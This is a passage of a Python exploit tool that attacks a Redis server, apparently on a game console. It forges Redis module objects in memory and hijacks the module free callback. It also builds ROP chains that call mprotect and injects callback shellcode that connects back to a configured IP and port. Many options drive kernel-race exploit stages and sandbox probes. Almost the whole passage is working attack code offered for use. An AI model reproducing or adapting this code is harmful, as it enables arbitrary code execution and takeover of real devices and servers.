        struct.pack_into("<Q", stack, 0x08, copy_len)

        fake_base = stack_addr + fake_off
        # d7b10 sends *(fake+0x98) as an SDS.  The copied bytes land exactly
        # at fake_base, while the one-byte SDS5 header immediately before it
        # survives the memcpy.
        stack[fake_off - 1] = (copy_len << 3) & 0xFF
        struct.pack_into("<I", stack, fake_off + 0x8C, args.dispatch_fd & 0xFFFFFFFF)
        struct.pack_into("<I", stack, fake_off + 0x90, 0)
        struct.pack_into("<Q", stack, fake_off + 0x98, fake_base)
        return bytes(stack), {
            "copy_send_fake_client": fake_base,
            "copy_send_src": stack_arg,
            "copy_send_len": copy_len,
            "copy_send_fd": args.dispatch_fd,
            "copy_send_offset": fake_off,
        }
    if getattr(args, "stack_cstring", None):
        text = args.stack_cstring.encode("ascii", errors="replace") + b"\x00"
        cstr_off = getattr(args, "stack_cstring_offset", None)
        if cstr_off is not None:
            if cstr_off < 0x10 or cstr_off >= stack_size:
                raise RuntimeError("--stack-cstring-offset must point inside the stack after the callback record")
            if cstr_off + len(text) > stack_size:
                raise RuntimeError("--stack-cstring does not fit at --stack-cstring-offset")
            stack = bytearray(pack64(stack_arg) + pack64(stack_ret))
            stack += pack64(0x4242424242424242) * ((stack_size - len(stack)) // 8)
            if len(stack) < stack_size:
                stack += b"B" * (stack_size - len(stack))
            stack[cstr_off:cstr_off + len(text)] = text
            return bytes(stack[:stack_size]), {
                "cstring": stack_addr + cstr_off,
                "cstring_len": len(text) - 1,
                "cstring_offset": cstr_off,
            }
        if len(text) > stack_size:
            raise RuntimeError("--stack-cstring is larger than --stack-size")
        stack = bytearray(b"\x00" * stack_size)
        stack[:len(text)] = text
        return bytes(stack), {"cstring": stack_addr, "cstring_len": len(text) - 1}
    if getattr(args, "stack_callback_shellcode", False):
        shellcode = build_callback_shellcode(args.callback_ip, args.callback_port, args.callback_msg)
        shell_off = args.shellcode_offset
        if shell_off < 0x10:
            raise RuntimeError("--shellcode-offset must leave room for the c24f0 argument pair")
        if shell_off + len(shellcode) > stack_size:
            raise RuntimeError(
                f"stack too small: shellcode end=0x{shell_off + len(shellcode):X} "
                f"stack_size=0x{stack_size:X}"
            )
        stack = bytearray(b"\x90" * stack_size)
        struct.pack_into("<Q", stack, 0x00, stack_arg & 0xFFFFFFFFFFFFFFFF)
        struct.pack_into("<Q", stack, 0x08, stack_ret & 0xFFFFFFFFFFFFFFFF)
        stack[shell_off:shell_off + len(shellcode)] = shellcode
        return bytes(stack), {
            "shellcode_addr": stack_addr + shell_off,
            "shellcode_len": len(shellcode),
            "shellcode_offset": shell_off,
            "pair0": stack_arg,
            "pair1": stack_ret,
        }
    if args.chain in ("crash", "dispatch-crash", "direct-shellcode"):
        if getattr(args, "stack_self_record", False):
            data_off = args.stack_data_offset
            if data_off < 0x10 or data_off >= stack_size:
                raise RuntimeError("--stack-data-offset must point inside the stack after the callback record")
            stack = bytearray(b"B" * stack_size)
            struct.pack_into("<Q", stack, 0x00, stack_addr + data_off)
            struct.pack_into("<Q", stack, 0x08, args.stack_callback_len)
            stack[data_off] = args.stack_data_byte & 0xFF
            return bytes(stack), {
                "callback_data": stack_addr + data_off,
                "callback_len": args.stack_callback_len,
                "data_byte": args.stack_data_byte & 0xFF,
            }
        stack = bytearray(pack64(stack_arg) + pack64(stack_ret))
        stack += pack64(0x4242424242424242) * ((stack_size - len(stack)) // 8)
        if len(stack) < stack_size:
            stack += b"B" * (stack_size - len(stack))
        return bytes(stack[:stack_size]), None

    if args.libc_base is None or args.libkernel_sys_base is None:
        raise RuntimeError("--chain mprotect-callback requires --libc-base and --libkernel-sys-base")

    shellcode = build_callback_shellcode(args.callback_ip, args.callback_port, args.callback_msg)
    shell_off = args.shellcode_offset
    if shell_off < 0x80:
        raise RuntimeError("--shellcode-offset must leave room for the ROP chain")
    if shell_off + len(shellcode) > stack_size:
        raise RuntimeError(
            f"stack too small: shellcode end=0x{shell_off + len(shellcode):X} stack_size=0x{stack_size:X}"
        )

    stack_page = stack_addr & ~(PAGE_SIZE - 1)
    chain = [
        args.stack_arg,  # consumed by pivot gadget's trailing pop rdi
        args.libc_base + LIBC_POP_RDI_RET,
        stack_page,
        args.libc_base + LIBC_POP_RSI_RET,
        args.mprotect_len,
        args.libc_base + LIBC_POP_RDX_POP_RBP_RET,
        args.mprotect_prot,
        0x4343434343434343,
        args.libkernel_sys_base + LIBKERNEL_SYS_MPROTECT,
        stack_addr + shell_off,
    ]

    stack = bytearray(b"\x90" * stack_size)
    for i, q in enumerate(chain):
        struct.pack_into("<Q", stack, i * 8, q & 0xFFFFFFFFFFFFFFFF)
    stack[shell_off:shell_off + len(shellcode)] = shellcode

    info = {
        "stack_page": stack_page,
        "shellcode_addr": stack_addr + shell_off,
        "shellcode_len": len(shellcode),
        "rop_qwords": len(chain),
        "mprotect": args.libkernel_sys_base + LIBKERNEL_SYS_MPROTECT,
    }
    return bytes(stack), info


def build_context_value(args, mt_addr, stack_addr, ctx_addr):
    ctx = bytearray(b"M" * args.ctx_size)
    if len(ctx) < 0x40:
        raise RuntimeError("--ctx-size is too small for moduleValue fields")

    # Redis calls moduleType->free(moduleValue->value), so keep value pointing
    # back to this same controlled buffer.  The called target then receives
    # rdi=ctx_addr.
    struct.pack_into("<Q", ctx, 0x00, mt_addr)
    struct.pack_into("<Q", ctx, 0x08, ctx_addr)
    struct.pack_into("<Q", ctx, 0x38, stack_addr)

    dispatch = None
    if args.chain == "direct-shellcode":
        shellcode = build_callback_shellcode(args.callback_ip, args.callback_port, args.callback_msg)
        shell_off = args.shellcode_offset
        if shell_off < 0x10:
            raise RuntimeError("--shellcode-offset must leave room for the moduleValue header")
        if shell_off + len(shellcode) > len(ctx):
            raise RuntimeError(
                f"ctx too small: shellcode end=0x{shell_off + len(shellcode):X} ctx_size=0x{len(ctx):X}"
            )
        shell_addr = ctx_addr + shell_off
        struct.pack_into("<Q", ctx, 0x08, shell_addr)
        ctx[shell_off:shell_off + len(shellcode)] = shellcode
        dispatch = {
            "target": args.pivot_addr,
            "arg": shell_addr,
            "shellcode_addr": shell_addr,
            "shellcode_len": len(shellcode),
            "field_module_value": 0x08,
        }
        return bytes(ctx), dispatch

    if args.chain == "dispatch-crash":
        mode = getattr(args, "dispatch_mode", "c24f0")
        if mode == "c5500":
            if len(ctx) < 0x98:
                raise RuntimeError("--ctx-size must be at least 0x98 for c5500 dispatch")
            data_ptr, arg2_source = dispatch_arg2_ptr(args, stack_addr)
            # FUN_000c5500 is a Redis rio-style write helper:
            #   if (*(int *)ctx == 0) write(ctx->fd, ctx->sds, sdslen(ctx->sds)).
            # It is useful here because Redis module free gives us exactly one
            # controlled pointer in rdi.
            struct.pack_into("<I", ctx, 0x00, 0)
            struct.pack_into("<I", ctx, 0x84, args.dispatch_arg)
            struct.pack_into("<I", ctx, 0x88, 0)
            struct.pack_into("<Q", ctx, 0x90, data_ptr)
            dispatch = {
                "target": args.pivot_addr,
                "arg": args.dispatch_arg,
                "arg2": data_ptr,
                "field_fd": 0x84,
                "field_sds": 0x90,
                "arg2_source": arg2_source,
            }
            return bytes(ctx), dispatch

        if len(ctx) < 0x128:
            raise RuntimeError("--ctx-size must be at least 0x128 for dispatch-crash")
        if args.dispatch_target is not None:
            target = args.dispatch_target
        else:
            if args.eboot_base is None:
                raise RuntimeError("--chain dispatch-crash needs --eboot-base or --dispatch-target")
            target = args.eboot_base + args.dispatch_target_offset
        if mode in ("c1900", "c1970"):
            arg2, arg2_source = dispatch_arg2_ptr(args, stack_addr)
            struct.pack_into("<Q", ctx, 0x10, target)
            struct.pack_into("<Q", ctx, 0x18, arg2)
            struct.pack_into("<Q", ctx, 0x20, args.dispatch_arg)
            dispatch = {
                "target": target,
                "arg": args.dispatch_arg,
                "arg2": arg2,
                "field_func": 0x10,
                "field_arg": 0x20,
                "field_arg2": 0x18,
                "arg2_source": arg2_source,
            }
        else:
            struct.pack_into("<Q", ctx, 0x0E8, args.dispatch_arg)
            struct.pack_into("<Q", ctx, 0x100, target)
            struct.pack_into("<Q", ctx, 0x120, 0)
            dispatch = {
                "target": target,
                "arg": args.dispatch_arg,
                "field_func": 0x100,
                "field_arg": 0x0E8,
            }
            if getattr(args, "fw", "250") == "300":
                followup = 0
                if getattr(args, "dispatch_followup_target", None) is not None:
                    followup = args.dispatch_followup_target
                elif getattr(args, "dispatch_followup_target_offset", None) is not None:
                    if args.eboot_base is None:
                        raise RuntimeError("--dispatch-followup-target-offset needs --eboot-base")
                    followup = args.eboot_base + args.dispatch_followup_target_offset
                pair_ptr, arg2_source = dispatch_arg2_ptr(args, stack_addr)
                struct.pack_into("<Q", ctx, 0x0B0, pair_ptr)
                struct.pack_into("<Q", ctx, 0x108, args.dispatch_arg)
                struct.pack_into("<Q", ctx, 0x120, followup)
                struct.pack_into("<Q", ctx, 0x138, target)
                struct.pack_into("<Q", ctx, 0x148, 0)
                if getattr(args, "dispatch_fd", None) is not None:
                    struct.pack_into("<I", ctx, 0x08C, args.dispatch_fd)
                    struct.pack_into("<I", ctx, 0x090, 0)
                    struct.pack_into("<Q", ctx, 0x098, stack_addr)
                dispatch = {
                    "target": target,
                    "arg": args.dispatch_arg,
                    "arg2": pair_ptr,
                    "field_pair": 0x0B0,
                    "field_arg": 0x108,
                    "field_followup": 0x120,
                    "followup": followup,
                    "field_func": 0x138,
                    "field_seen": 0x148,
                    "arg2_source": arg2_source,
                }
    return bytes(ctx), dispatch


def build_module_type_value(pivot_addr, free_offset=None):
    if free_offset is None:
        mt_value = bytearray(struct.pack("<Q", pivot_addr) * (DEFAULT_RAW_SIZE // 8))
        mt_value[MARKER_AT:MARKER_AT + 8] = b"CXRMTOK!"
        return bytes(mt_value)
    if free_offset < 0:
        return bytes(DEFAULT_RAW_SIZE)
    if free_offset + 8 > DEFAULT_RAW_SIZE:
        raise RuntimeError("--module-type-free-offset is outside the fake moduleType buffer")
    mt_value = bytearray(b"\x00" * DEFAULT_RAW_SIZE)
    struct.pack_into("<Q", mt_value, free_offset, pivot_addr)
    return bytes(mt_value)


def write_fake_objects(sock, mt_key, stack_key, ctx_key, mt_addr, stack_addr, ctx_addr, pivot_addr, stack_value, ctx_value, mt_value=None):
    mt_value = mt_value or build_module_type_value(pivot_addr)
    hll.cmd(sock, "SETRANGE", mt_key, "0", bytes(mt_value), timeout=60)

    hll.cmd(sock, "SETRANGE", stack_key, "0", stack_value, timeout=60)
    hll.cmd(sock, "SETRANGE", ctx_key, "0", ctx_value, timeout=60)

    got_mt = hll.cmd(sock, "GETRANGE", mt_key, "0", "63", timeout=60)
    got_st = hll.cmd(sock, "GETRANGE", stack_key, "0", str(len(stack_value) - 1), timeout=60)
    got_ctx = hll.cmd(sock, "GETRANGE", ctx_key, "0", str(len(ctx_value) - 1), timeout=60)
    if got_mt != mt_value[:64]:
        raise RuntimeError("moduleType verification failed")
    if got_st != stack_value:
        raise RuntimeError("stack verification failed")
    if got_ctx != ctx_value:
        raise RuntimeError("context verification failed")
    print(
        f"[prespray] fake moduleType=0x{mt_addr:X} pivot=0x{pivot_addr:X} "
        f"ctx=0x{ctx_addr:X} [ctx+0x38]=0x{stack_addr:X} "
        f"ctx_len=0x{len(ctx_value):X} stack_len=0x{len(stack_value):X}"
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.50.192")
    ap.add_argument("--port", type=int, default=1003)
    ap.add_argument("--prefix", default=None)
    ap.add_argument("--eggs", type=int, default=512)
    ap.add_argument("--layout-fillers", type=int, default=80)
    ap.add_argument("--preserve-cal-c-slot", action="store_true")
    ap.add_argument("--scan-size", type=lambda x: int(x, 0), default=0x1000000)
    ap.add_argument("--flag-search-span", type=lambda x: int(x, 0), default=0x80)
    ap.add_argument("--bruteforce-reg-values", action="store_true")
    ap.add_argument("--pivot-addr", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-ret", type=lambda x: int(x, 0), default=0x4141414141414141)
    ap.add_argument("--stack-arg", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--stack-arg-stack-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-ret-stack-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-arg-eboot-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-ret-eboot-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-patch-hex", default=None)
    ap.add_argument("--stack-patch-offset", type=lambda x: int(x, 0), default=0x200)
    ap.add_argument("--stack-execve-path", default=None)
    ap.add_argument("--stack-execve-arg", action="append", default=None)
    ap.add_argument("--stack-execve-path-offset", type=lambda x: int(x, 0), default=0x80)
    ap.add_argument("--stack-execve-argv-offset", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--stack-execve-envp-offset", type=lambda x: int(x, 0), default=0x70)
    ap.add_argument("--stack-self-record", action="store_true")
    ap.add_argument("--stack-cstring", default=None)
    ap.add_argument("--stack-cstring-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--stack-callback-shellcode", action="store_true")
    ap.add_argument("--stack-lowrop-send", action="store_true")
    ap.add_argument("--stack-lowrop-got-leak", action="store_true")
    ap.add_argument("--stack-lowrop-notify", action="store_true")
    ap.add_argument("--stack-lowrop-dlsym-probe", action="store_true")
    ap.add_argument("--stack-lowrop-module-dlsym-probe", action="store_true")
    ap.add_argument("--stack-lowrop-module-table-leak", action="store_true")
    ap.add_argument("--stack-lowrop-dynlib-list-probe", action="store_true")
    ap.add_argument("--stack-lowrop-self-dlsym-probe", action="store_true")
    ap.add_argument("--stack-lowrop-self-info-leak", action="store_true")
    ap.add_argument("--stack-lowrop-mprotect-probe", action="store_true")
    ap.add_argument("--stack-lowrop-indirect-send-probe", action="store_true")
    ap.add_argument("--stack-lowrop-eboot-getpid-probe", action="store_true")
    ap.add_argument("--stack-lowrop-eboot-gettimeofday-probe", action="store_true")
    ap.add_argument("--stack-lowrop-eboot-mprotect-probe", action="store_true")
    ap.add_argument("--stack-lowrop-libc-getpid-probe", action="store_true")
    ap.add_argument("--stack-lowrop-libc-gettimeofday-probe", action="store_true")
    ap.add_argument("--stack-lowrop-wrapper-call-probe", action="store_true")
    ap.add_argument("--stack-lowrop-direct-syscall-probe", action="store_true")
    ap.add_argument("--stack-lowrop-code-read-probe", action="store_true")
    ap.add_argument("--stack-lowrop-sandbox-probe", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-wrapper-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-race-one", action="store_true")
    ap.add_argument("--stack-lowrop-umtx2-spray-existing", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-thread-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-worker-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-suspend-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-race-one", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-rthdr-preflight", action="store_true")
    ap.add_argument("--stack-lowrop-lapse-race-rthdr", action="store_true")
    ap.add_argument("--lowrop-lapse-rthdr-count", type=int, default=1)
    ap.add_argument("--lowrop-lapse-rthdr-set-loops", type=lambda x: int(x, 0), default=1)
    ap.add_argument("--lowrop-lapse-rthdr-skip-reclaim", action="store_true")
    ap.add_argument("--lowrop-lapse-rthdr-per-socket-setbuf", action="store_true")
    ap.add_argument("--lowrop-lapse-rthdr-segment-floor", type=lambda x: int(x, 0), default=0x2D80)
    ap.add_argument("--lowrop-lapse-target-req-index", type=lambda x: int(x, 0), default=2)
    ap.add_argument("--lowrop-lapse-post-resume-yields", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-lapse-post-resume-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-post-resume-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-worker-ack", action="store_true")
    ap.add_argument("--lowrop-lapse-worker-ack-poll-ms", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-worker-ready-ack", action="store_true")
    ap.add_argument("--lowrop-lapse-worker-ready-pipe", action="store_true")
    ap.add_argument("--lowrop-lapse-worker-park", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-reclaim-send", action="store_true")
    ap.add_argument("--lowrop-lapse-post-reclaim-send", action="store_true")
    ap.add_argument("--lowrop-lapse-post-main-delete-send", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-delete-send", action="store_true")
    ap.add_argument("--lowrop-lapse-tcpinfo-before-poll", action="store_true")
    ap.add_argument("--lowrop-lapse-debug-sends", action="store_true")
    ap.add_argument("--lowrop-lapse-after-ack-send", action="store_true")
    ap.add_argument("--lowrop-lapse-block-workers", action="store_true")
    ap.add_argument("--lowrop-lapse-block-worker-count", type=lambda x: int(x, 0), default=2)
    ap.add_argument("--lowrop-lapse-prezero-r9-once", action="store_true")
    ap.add_argument("--lowrop-lapse-skip-rthdr-optlen-store", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-barrier-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-barrier-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-barrier-getpid-loops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-barrier-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-suspend-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-post-poll-rop-nops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-post-poll-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-client-fill-len", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-sockbuf-size", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-conn-drain-len", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-suspend-getpid-loops", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-pre-suspend-yield", action="store_true")
    ap.add_argument("--lowrop-lapse-pre-suspend-yields", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-lapse-pre-suspend-sleep-ns", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-lapse-main-prio-pin", action="store_true")
    ap.add_argument("--lowrop-lapse-cpuset-size", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-lapse-thread-start", choices=("longjmp", "ret", "setcontext", "pivot", "none"), default="longjmp")
    ap.add_argument("--lowrop-scratch-offset", type=lambda x: int(x, 0), default=0x14A000)
    ap.add_argument("--lowrop-vtable-offset", type=lambda x: int(x, 0), default=0x200)
    ap.add_argument("--lowrop-chain-offset", type=lambda x: int(x, 0), default=0x28D)
    ap.add_argument("--lowrop-msg-offset", type=lambda x: int(x, 0), default=0x380)
    ap.add_argument("--lowrop-pair-offset", type=lambda x: int(x, 0), default=0x70)
    ap.add_argument("--lowrop-copy-len", type=lambda x: int(x, 0), default=0x800)
    ap.add_argument("--lowrop-external-msg", action="store_true")
    ap.add_argument("--lowrop-external-msg-size", type=lambda x: int(x, 0), default=0x10000)
    ap.add_argument("--lowrop-external-msg-count", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-external-msg-align", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--lowrop-allow-uncopied-msg-tail", action="store_true")
    ap.add_argument("--lowrop-truncate-msg-tail", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-msg", default="LOWROP_SEND_OK")
    ap.add_argument("--lowrop-leak-eboot-offset", type=lambda x: int(x, 0), action="append", default=None)
    ap.add_argument("--lowrop-dlsym-handle", type=lambda x: int(x, 0), action="append", default=None)
    ap.add_argument("--lowrop-dlsym-symbol", action="append", default=None)
    ap.add_argument("--lowrop-module-name", action="append", default=None)
    ap.add_argument("--lowrop-module-dlsym-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-module-table-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-module-table-entries", type=lambda x: int(x, 0), default=12)
    ap.add_argument("--lowrop-dynlib-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-dynlib-list-max", type=lambda x: int(x, 0), default=32)
    ap.add_argument("--lowrop-dynlib-capture-errno", action="store_true")
    ap.add_argument(
        "--lowrop-dynlib-list-order",
        choices=("handles-max-count", "count-handles-max", "handles-count-max"),
        default="handles-max-count",
    )
    ap.add_argument("--lowrop-self-dlsym-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-dlsym-symbol-offset", type=lambda x: int(x, 0), default=0xB00)
    ap.add_argument("--lowrop-dlsym-out-offset", type=lambda x: int(x, 0), default=0xC00)
    ap.add_argument("--lowrop-mprotect-addr", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-mprotect-target", choices=("scratch", "stack"), default="scratch")
    ap.add_argument("--lowrop-mprotect-len", type=lambda x: int(x, 0), default=PAGE_SIZE)
    ap.add_argument("--lowrop-mprotect-prot", type=lambda x: int(x, 0), default=7)
    ap.add_argument("--lowrop-mprotect-capture-errno", action="store_true")
    ap.add_argument("--lowrop-mprotect-derive-only", action="store_true")
    ap.add_argument("--lowrop-eboot-mprotect-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-eboot-getpid-derive-only", action="store_true")
    ap.add_argument("--lowrop-eboot-gettimeofday-derive-only", action="store_true")
    ap.add_argument("--lowrop-libc-getpid-derive-only", action="store_true")
    ap.add_argument("--lowrop-libc-gettimeofday-derive-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-wrapper-source", choices=("getpid", "gettimeofday", "send"), default="getpid")
    ap.add_argument("--lowrop-wrapper-offset", type=lambda x: int(x, 0), default=LIBKERNEL_SYS_GETPID)
    ap.add_argument("--lowrop-wrapper-msg-len", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--lowrop-wrapper-prezero-r8-r9", action="store_true")
    ap.add_argument("--lowrop-wrapper-capture-errno", action="store_true")
    ap.add_argument("--lowrop-wrapper-use-libc-call8", action="store_true")
    ap.add_argument("--lowrop-wrapper-call8-send-self", action="store_true")
    ap.add_argument("--lowrop-wrapper-use-setcontext", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-offset", type=lambda x: int(x, 0), default=LIBC_SETCONTEXT)
    ap.add_argument("--lowrop-wrapper-no-save-context", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-ping-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-send-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-call-rax", action="store_true")
    ap.add_argument("--lowrop-wrapper-setcontext-pivot-only", action="store_true")
    ap.add_argument("--lowrop-wrapper-preflight-send", action="store_true")
    for _i in range(1, 7):
        ap.add_argument(f"--lowrop-wrapper-arg{_i}", type=lambda x: int(x, 0), default=0)
        ap.add_argument(f"--lowrop-wrapper-arg{_i}-msg-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-wrapper-arg{_i}-scratch-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-direct-syscall-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-direct-syscall-source", choices=("getpid", "gettimeofday"), default="gettimeofday")
    ap.add_argument("--lowrop-direct-syscall-wrapper-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-direct-syscall-landing-adjust", type=lambda x: int(x, 0), default=7)
    ap.add_argument("--lowrop-direct-syscall-num", type=lambda x: int(x, 0), default=20)
    ap.add_argument("--lowrop-direct-syscall-msg-len", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--lowrop-direct-syscall-capture-errno", action="store_true")
    ap.add_argument("--lowrop-direct-syscall-sixargs", action="store_true")
    for _i in range(1, 7):
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}", type=lambda x: int(x, 0), default=0)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-msg-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-scratch-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-stack-offset", type=lambda x: int(x, 0), default=None)
        ap.add_argument(f"--lowrop-direct-syscall-arg{_i}-stack-page-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-code-read-source", choices=("getpid", "gettimeofday", "send", "sceKernelDlsym", "memcpy", "libc-getpid", "libc-gettimeofday", "msg"), default="gettimeofday")
    ap.add_argument("--lowrop-code-read-flavor", choices=("sys", "kernel"), default="sys")
    ap.add_argument("--lowrop-umtx2-existing-fd", type=lambda x: int(x, 0), default=24)
    ap.add_argument("--lowrop-umtx2-spray-count", type=lambda x: int(x, 0), default=8)
    ap.add_argument("--lowrop-umtx2-inline-spray-count", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-umtx2-preserve-lookup-fd", action="store_true")
    ap.add_argument("--lowrop-umtx2-worker-spray", action="store_true")
    ap.add_argument("--lowrop-umtx2-worker-spray-gate", action="store_true")
    ap.add_argument("--lowrop-umtx2-worker-spray-post-yields", type=lambda x: int(x, 0), default=4)
    ap.add_argument("--lowrop-umtx2-main-tag-worker-fds", action="store_true")
    ap.add_argument("--lowrop-umtx2-race-debug", action="store_true")
    ap.add_argument("--lowrop-umtx2-destroy-delay-target", choices=("none", "d0", "d1", "both"), default="none")
    ap.add_argument("--lowrop-umtx2-destroy-delay-yields", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-umtx2-destroy-pad-target", choices=("none", "d0", "d1", "both"), default="none")
    ap.add_argument("--lowrop-umtx2-destroy-pad-count", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-code-read-wrapper-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lowrop-code-read-adjust", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-code-read-len", type=lambda x: int(x, 0), default=0x80)
    ap.add_argument("--lowrop-code-read-msg-len", type=lambda x: int(x, 0), default=0x40)
    ap.add_argument("--lowrop-sandbox-path", action="append", default=None)
    ap.add_argument("--lowrop-sandbox-max-paths", type=lambda x: int(x, 0), default=32)
    ap.add_argument("--lowrop-sandbox-open-flags", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--lowrop-send-export-offset", type=lambda x: int(x, 0), default=LIBKERNEL_SYS_SEND_EXPORT)
    ap.add_argument("--lowrop-syscall-offset", type=lambda x: int(x, 0), default=LIBKERNEL_SYS_MPROTECT)
    ap.add_argument("--lowrop-notify-text", default="Redis ROP notification")
    ap.add_argument("--lowrop-notify-done-msg", default="NOTIFY_ROP_DONE")
    ap.add_argument("--lowrop-notify-offset", type=lambda x: int(x, 0), default=0x1000)
    ap.add_argument("--lowrop-notify-const-offset", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--lowrop-notify-fd-slot-offset", type=lambda x: int(x, 0), default=0x118)
    ap.add_argument("--lowrop-notify-path-offset", type=lambda x: int(x, 0), default=0x128)
    ap.add_argument("--lowrop-notify-icon-offset", type=lambda x: int(x, 0), default=0x150)
    ap.add_argument("--lowrop-notify-text-offset", type=lambda x: int(x, 0), default=0x180)
    ap.add_argument("--stack-data-offset", type=lambda x: int(x, 0), default=0x100)
    ap.add_argument("--stack-callback-len", type=lambda x: int(x, 0), default=1)
    ap.add_argument("--stack-data-byte", type=lambda x: int(x, 0), default=0x41)
    ap.add_argument("--chain", choices=("crash", "mprotect-callback", "dispatch-crash", "direct-shellcode"), default="crash")
    ap.add_argument("--ctx-size", type=lambda x: int(x, 0), default=DEFAULT_CTX_SIZE)
    ap.add_argument("--stack-size", type=lambda x: int(x, 0), default=DEFAULT_STACK_SIZE)
    ap.add_argument("--shellcode-offset", type=lambda x: int(x, 0), default=0x180)
    ap.add_argument("--libc-base", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--libkernel-sys-base", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--mprotect-len", type=lambda x: int(x, 0), default=PAGE_SIZE)
    ap.add_argument("--mprotect-prot", type=lambda x: int(x, 0), default=7)
    ap.add_argument("--callback-ip", default="192.168.50.154")
    ap.add_argument("--callback-port", type=int, default=3234)
    ap.add_argument("--callback-msg", default="CXROP callback")
    ap.add_argument("--eboot-base", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--fw", choices=tuple(sorted(FW_PROFILES)), default="300")
    ap.add_argument("--dispatch-mode", choices=("c24f0", "c1900", "c1970", "c5500"), default="c1900")
    ap.add_argument("--dispatch-func-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-target", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-target-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-arg", type=lambda x: int(x, 0), default=0x1337133713371337)
    ap.add_argument("--dispatch-arg-ctx", action="store_true")
    ap.add_argument("--dispatch-arg-stack-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-arg-eboot-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dispatch-fd", type=int, default=None)
    ap.add_argument("--dispatch-arg2", type=lambda x: int(x, 0), default=0x2442244224422442)
    ap.add_argument("--dispatch-arg2-stack", action="store_true")
    ap.add_argument("--dispatch-arg2-stack-offset", type=lambda x: int(x, 0), default=None)
